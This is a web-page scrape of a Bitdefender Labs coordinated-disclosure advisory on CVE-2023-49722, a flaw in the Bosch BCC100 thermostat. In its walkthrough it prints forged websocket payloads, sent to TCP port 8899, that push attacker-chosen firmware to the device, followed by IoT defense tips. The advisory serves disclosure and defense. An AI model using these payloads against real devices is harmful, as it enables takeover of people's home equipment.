      </p></div> <!----> <!----></div></div> <div class="tw-mt-4 sm:tw-mt-0 sm:tw-w-2/3"><div class="tw-relative tw-rounded tw-bg-[#f4f7fa] tw-py-2 tw-pl-11 tw-pr-2 tw-text-xs"><em class="tw-absolute tw-left-2.5 tw-top-2 tw-text-[10px]">Promo</em> <span class="pe-2">Protect all your devices, without slowing them down.</span> <br> <a target="_blank" href="/Downloads/" class="tw-text-[#608dff]">Free 30-day trial</a></div></div></div> <picture class="tw-my-6"><source data-not-lazy="" media="(max-width: 600px)" data-srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2024/01/technology-gbbc352657_1920.jpg"> <source data-not-lazy="" media="(min-width: 701px)" data-srcset="https://blogapp.bitdefender.com/labs/content/images/size/w1000/2024/01/technology-gbbc352657_1920.jpg"> <img data-not-lazy="" data-src="https://blogapp.bitdefender.com/labs/content/images/size/w600/2024/01/technology-gbbc352657_1920.jpg" alt="Vulnerabilities identified in Bosch BCC100 Thermostat" title="Vulnerabilities identified in Bosch BCC100 Thermostat" width="600" height="400" src="https://blogapp.bitdefender.com/labs/content/images/size/w600/2024/01/technology-gbbc352657_1920.jpg" class="tw-my-4 tw-w-full"></picture> <div class="content tw-mb-12 tw-text-lg tw-text-black"><p>Several factors underscore the importance of smart thermostats: energy efficiency, environmental sustainability, and the spread of smart home technologies. These devices have a major impact on energy conservation and its associated cost savings, while making homes noticeably more comfortable.</p><p>This combination of energy efficiency, convenience and environmental consciousness, which resonate with the current priorities of individuals, governments and societies, have led to the diversification of an ecosystem comprised of multiple vendors and technologies.</p><p>As the creator of the world’s first smart home cybersecurity hub, Bitdefender regularly audits popular IoT hardware for vulnerabilities that might affect customers if left unaddressed. This research article is part of a broader program and aims to shed light on the security of the world’s best-sellers in the IoT space. This report covers the Bosch BCC100 thermostat and reveals vulnerabilities affecting the SW version 1.7.0 – HD Version 4.13.22.</p><h1 id="vulnerability-at-a-glance">Vulnerability at a glance</h1><p>[LOCAL] During our security audit, Bitdefender researchers discovered a vulnerability that lets an attacker on the same network replace the device firmware with a rogue version (<a href="https://www.cve.org/CVERecord?id=CVE-2023-49722">CVE-2023-49722</a>).</p><h1 id="disclosure-timeline">Disclosure timeline</h1><ul><li>Aug 29, 2023: Bitdefender makes first contact with the vulnerable vendor and submits the full report</li><li>Sep 18, 2023: Bitdefender learns that the issue is still undergoing internal investigation at the vendor</li><li>Oct 04, 2023: Vulnerability is triaged and confirmed.</li><li>Oct 30, 2023: Bitdefender asks for an update, and is told the issue is still being handled</li><li>Nov 11, 2023: Fix deployed in production.</li><li>Nov 17, 2023: Bitdefender asks for additional info about the update timeline in preparation for coordinated vulnerability disclosure</li><li>Jan 11, 2024: This report becomes public.</li></ul><h1 id="vulnerability-walkthrough">Vulnerability walkthrough</h1><p>The thermostat has two microcontrollers that work together, as seen in the picture below. The one on the right, in yellow, is a Hi-Flying chip, HF-LPT230, that implements the Wi-Fi functionality. It acts as a network gateway for the logic microcontroller. The STMicroelectronics chip, STM32F103, in red, is the brain of the device and implements the main logic.</p><figure class="kg-card kg-image-card"><img src="blob:https://blogapp.bitdefender.com/2e5782fb-b912-4ffd-b093-f5ee73f84c9e" class="kg-image" alt loading="lazy"></figure><p>The STM chip has no networking capabilities and instead relies on the Wi-Fi chip to communicate with the Internet. It uses the UART protocol to pass data to the Wi-Fi chip, which acts as a gateway/proxy and establishes the actual connection to the servers.</p><p>We have discovered that the Wi-Fi chip also listens on TCP port 8899 on the <a>LAN, and</a> will mirror any message received on that port directly to the main microcontroller, through the UART data bus. This means that, if formatted correctly, the microcontroller can’t distinguish malicious messages from genuine ones sent by the cloud server. This allows an attacker to send commands to the thermostat, including writing <a>a malicious</a> update to the device.</p><h2 id="updating-the-thermostat-with-arbitrary-firmware">Updating the thermostat with arbitrary firmware</h2><p>The thermostat communicates with the <strong>connect.boschconnectedcontrol.com</strong> server through JSON encoded payloads over a <a>websocket</a>. The packets sent by the server are unmasked, making them easy to imitate.</p><p>First, we send the “device/update” command on port 8899 that lets the device know that there is a new update and to start the update procedure:</p><p><em><code><a>\x81\x46{</a>"cmd":"device/update","device_id":"&lt;device mac address&gt;","timestamp":1111111}</code></em></p><p>This will prompt the thermostat to ask the cloud server for details about the update:</p><p><em><code>{"cmd":"server/fireware","device_id":"&lt;device mac address&gt;","timestamp":"&lt;unix timestamp&gt;","model":"BCC101","version":"1.7.0","id":"0"}</code></em></p><p>Even though the server responds with an error code because there is no update available:</p><p><em><code>{"error_code":"99","cmd":"server/fireware","device_id":"&lt;device mac address&gt;","timestamp":"&lt;unix timestamp&gt;"}</code></em></p><p>The device will also accept a forged response containing the update details:</p><p><em><code>\x81\x7e\x01\x33{"error_code":"0","cmd":"server/fireware","device_id":"&lt;device mac&gt;","timestamp":"&lt;unix timestamp&gt;","model":"BCC101","version":"&lt;fw version&gt;","url":"&lt;firmware URL&gt;","size":"&lt;firmware size&gt;","isize":"0","pic_pos":"2930","md5":"&lt;firmware md5&gt;","type":0,"release_date":"1111-11-11"}</code></em></p><p>This packet contains the URL where the firmware will be downloaded from, the size and MD5 checksum of the firmware file, and the version of the new firmware, which must be higher than the current one. There are no validation mechanisms for firmware update authenticity.</p><p>If all the conditions match, the thermostat asks the cloud server to download the firmware and send it through the websocket:</p><p><em><code>{"cmd":"server/deviceUpdate","device_id":"&lt;device mac&gt;","timestamp":"&lt;unix timestamp&gt;","url":"&lt;firmware URL&gt;","pindex":"0"}</code></em></p><p>The URL must be Internet-accessible, as the cloud server is the component that downloads the file. After the device receives the <a>file</a>, it performs the upgrade. At this point, the device is considered totally compromised.</p><figure class="kg-card kg-image-card"><img src="blob:https://blogapp.bitdefender.com/9d5ad958-a94e-4603-8a32-481a6b580793" class="kg-image" alt loading="lazy"></figure><h2 id="best-practices-for-iot-devices">Best practices for IoT devices</h2><p>Home users should closely monitor IoT devices and isolate them as completely as possible from the local network. This can be done by setting up a dedicated network exclusively for IoT devices.</p><p>Additionally, IoT users can use the <a href="https://www.bitdefender.com/solutions/home-scanner.html">free Bitdefender Smart Home Scanner</a> app to scan for connected devices, identify and highlight vulnerable ones. IoT device owners should also check for newer firmware and update devices as soon as the vendor releases new versions.</p><p>To minimize risks of compromise, smart home users should consider adopting a network cybersecurity solution integrated into the router, such as the NETGEAR Orbi or Nighthawk routers powered by <a href="https://www.netgear.com/home/services/armor/">Bitdefender Armor</a>.</p></div> <div><!----> <div><p class="tw-py-4 tw-pl-4 tw-font-bold tw-uppercase">tags</p></div> <!----></div> <div class="tw-mb-2.5 tw-flex tw-flex-wrap tw-items-center tw-text-xs tw-font-bold tw-uppercase tw-text-[#608DFF]"><!----><a href="/en-gb/blog/labs/tag/iot-research/" title="IoT Research" class="tw-mr-4 tw-mb-4 tw-border tw-border-[#eff0f1] tw-bg-white tw-p-4 tw-text-xs tw-font-normal tw-lowercase tw-text-[#7c7c7c] hover:tw-bg-[#d4d7d9]">IoT Research
